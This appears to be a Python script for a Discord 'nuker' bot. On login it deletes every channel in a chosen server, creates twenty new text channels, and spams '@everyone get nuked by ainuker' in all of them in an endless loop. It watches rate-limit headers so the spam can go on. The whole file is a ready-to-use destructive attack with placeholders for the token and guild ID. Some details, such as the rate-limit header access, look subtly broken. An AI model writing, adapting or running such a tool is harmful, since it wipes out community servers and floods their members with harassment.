import os
import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.guild_messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

    # Call the function to delete channels, create new ones, and send messages
    await delete_and_create_channels()

async def delete_and_create_channels():
    guild_id = "Guild id" # Replace with your guild ID(Remove the "")
    guild = bot.get_guild(guild_id)

    # Delete existing channels
    for channel in guild.channels:
        await channel.delete()

    # Create 20 new text channels
    for i in range(1, 21):
        await guild.create_text_channel(f'channel-{i}')

    # Send messages in a loop and handle rate-limiting
    channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]

    async def send_message(channel):
        while True:
            try:
                message = await channel.send('@everyone get nuked by ainuker')

                # Access headers from the response
                response = message._state.http.response
                remaining = int(response.headers.get('X-RateLimit-Remaining', 0))
                reset_time = int(response.headers.get('X-RateLimit-Reset', 0))

                print(f"Message sent in {channel.name}")

                if remaining == 0:
                    print(f"Rate limited! Waiting for {reset_time} seconds.")
                    await asyncio.sleep(reset_time)
                else:
                    await asyncio.sleep(2)  # Delay between messages

            except discord.HTTPException as e:
                print(f"Error sending message: {e}")

    await asyncio.gather(*(send_message(channel) for channel in channels))
    print("Server Nuked")

# Replace 'YOUR_BOT_TOKEN' with your actual bot token
bot.run('YOUR_BOT_TOKEN')
